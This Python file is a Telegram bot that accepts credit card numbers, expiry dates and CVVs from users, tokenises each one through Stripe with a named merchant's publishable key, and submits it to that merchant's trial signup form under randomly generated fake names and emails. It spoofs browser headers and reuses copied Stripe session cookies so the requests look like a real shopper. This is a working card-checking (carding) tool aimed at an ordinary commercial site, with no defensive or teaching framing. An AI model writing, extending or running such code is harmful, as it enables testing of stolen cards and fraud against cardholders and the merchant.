import telebot
import requests
import json
import logging
import random
import string
import time

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace with your actual Telegram Bot Token
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
bot = telebot.TeleBot(BOT_TOKEN)

# Rocketshipit Specific Information
ROCKETSHIPIT_BASE_URL = "https://www.rocketshipit.com"
STRIPE_API_URL = "https://api.stripe.com/v1/tokens"
PLAN_ID = "price_0OasfuftKVWrByuepaoLFVSB"  # From your example
COUPON_CODE = ""  # You can modify this if needed

# **CRITICAL: Replace with the ACTUAL Rocketshipit Stripe Publishable Key**
STRIPE_PUBLIC_KEY = "pk_0BxZtv2UcRHjy0D3BO0jGVxdZKnqI"

# Headers for Stripe API
STRIPE_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15",
    "Origin": "https://www.rocketshipit.com",
}

# Headers for Rocketshipit Trial Submission
ROCKETSHIPIT_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Origin": "https://www.rocketshipit.com",
    "Referer": "https://www.rocketshipit.com/trial",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

# Cookies (You MUST find the actual values from the website)
ROCKETSHIPIT_COOKIES = {
    "__stripe_mid": "5165694b-6b39-4b75-a3ad-d182d56d6cc3c3b40e",
    "__stripe_sid": "09344d18-ca92-4776-933d-5d12292ff3da7a0f9a",
}

def generate_random_string(length=32):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_dynamic_email():
    return f"testuser_{generate_random_string(8)}@example.com"

def generate_dynamic_name():
    return f"Test User {generate_random_string(5).capitalize()}"

def create_stripe_token(cc, mm, yy, cvv, name, email, guid, muid, sid):
    referrer = "https://www.rocketshipit.com/trial"
    time_on_page = random.randint(5000, 60000)  # Simulate time on page (milliseconds)
    payment_user_agent = "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; card-element"
    pasted_fields = "number"

    payload = f"guid={guid}&muid={muid}&sid={sid}&referrer={referrer}&time_on_page={time_on_page}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent={payment_user_agent}&pasted_fields={pasted_fields}&key={STRIPE_PUBLIC_KEY}"
    headers = STRIPE_HEADERS.copy()
    logging.info(f"Stripe Token Request URL: {STRIPE_API_URL}")
    logging.info(f"Stripe Token Request Headers: {headers}")
    logging.info(f"Stripe Token Request Payload: {payload}")
    try:
        response = requests.post(STRIPE_API_URL, headers=headers, data=payload)
        logging.info(f"Stripe Token Response Status Code: {response.status_code}")
        logging.info(f"Stripe Token Response Headers: {response.headers}")
        try:
            response_json = response.json()
            logging.info(f"Stripe Token Response JSON: {json.dumps(response_json)}")
            response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
            return response_json.get("id")
        except json.JSONDecodeError:
            logging.error(f"Error decoding Stripe token response: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Error creating Stripe token: {e}")
        return None
    except json.JSONDecodeError:
        logging.error(f"Error decoding Stripe token response (success case): {response.text}")
        return None

# --- Part 1 Ends Here ---
# --- Part 2 Begins Here ---

def submit_trial_form(stripe_token, name, email):
    url = f"{ROCKETSHIPIT_BASE_URL}/trial"
    payload = f"plan={PLAN_ID}&coupon={COUPON_CODE}&name={name}&email={email}&stripeToken={stripe_token}"
    headers = ROCKETSHIPIT_HEADERS.copy()
    headers["Content-Length"] = str(len(payload))
    try:
        response = requests.post(url, headers=headers, data=payload, cookies=ROCKETSHIPIT_COOKIES, allow_redirects=True)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        logging.error(f"Error submitting trial form: {e} - Response: {response.text}")
        return f"Error submitting trial: {e}"

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me credit card details in the format: cc|mm|yy|cvv")

@bot.message_handler(func=lambda message: len(message.text.split('|')) == 4)
def process_card(message):
    try:
        cc, mm_str, yy_str, cvv = message.text.split('|')

        if not (mm_str.isdigit() and yy_str.isdigit() and cvv.isdigit()):
            bot.reply_to(message, "Invalid month, year, or CVV. Please use numbers.")
            return

        mm = int(mm_str)
        yy = int(yy_str) if len(yy_str) == 4 else int(f"20{yy_str}")

        bot.reply_to(message, "Processing card...")

        dynamic_email = generate_dynamic_email()
        dynamic_name = generate_dynamic_name()
        guid = "44447146-f191-4882-b384-e3f5e0470d45e7609d"
        muid = ROCKETSHIPIT_COOKIES.get("__stripe_mid", "")
        sid = ROCKETSHIPIT_COOKIES.get("__stripe_sid", "")

        stripe_token = create_stripe_token(cc, mm, yy, cvv, dynamic_name, dynamic_email, guid, muid, sid)

        if stripe_token:
            bot.reply_to(message, f"Stripe Token created: {stripe_token}. Submitting trial...")
            website_response = submit_trial_form(stripe_token, dynamic_name, dynamic_email)
            bot.reply_to(message, f"Website Response:\n{website_response}")
        else:
            bot.reply_to(message, "Failed to create Stripe token. Card might be invalid.")

    except ValueError:
        bot.reply_to(message, "Invalid input format. Please use: cc|mm|yy|cvv")
    except Exception as e:
        logging.error(f"Error processing card input: {e}")
        bot.reply_to(message, f"An error occurred: {e}")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Send me credit card details in the format: cc|mm|yy|cvv")

if __name__ == '__main__':
    logging.info("Bot started...")
    bot.polling(none_stop=True)
